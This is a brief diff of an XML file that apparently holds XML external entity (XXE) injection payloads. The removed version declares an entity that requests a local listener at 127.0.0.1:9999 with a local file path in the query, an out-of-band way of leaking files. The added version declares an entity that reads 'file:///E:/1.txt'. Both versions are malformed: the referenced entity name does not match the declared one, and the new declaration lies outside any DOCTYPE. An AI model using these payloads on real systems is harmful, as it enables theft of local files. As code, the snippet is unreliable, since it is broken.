@@ -1,5 +1,2 @@
-<?xml version='1.0'?>
-<!DOCTYPE send[<!ENTITY test SYSTEM 'http://127.0.0.1:9999?p=file:///E:/1.txt;'>]>
-<comment>
-    <text>&send;</text>
-</comment>
+<?xml version="1.0" encoding="UTF-8"?>
+        <!ENTITY secret SYSTEM 'file:///E:/1.txt'>
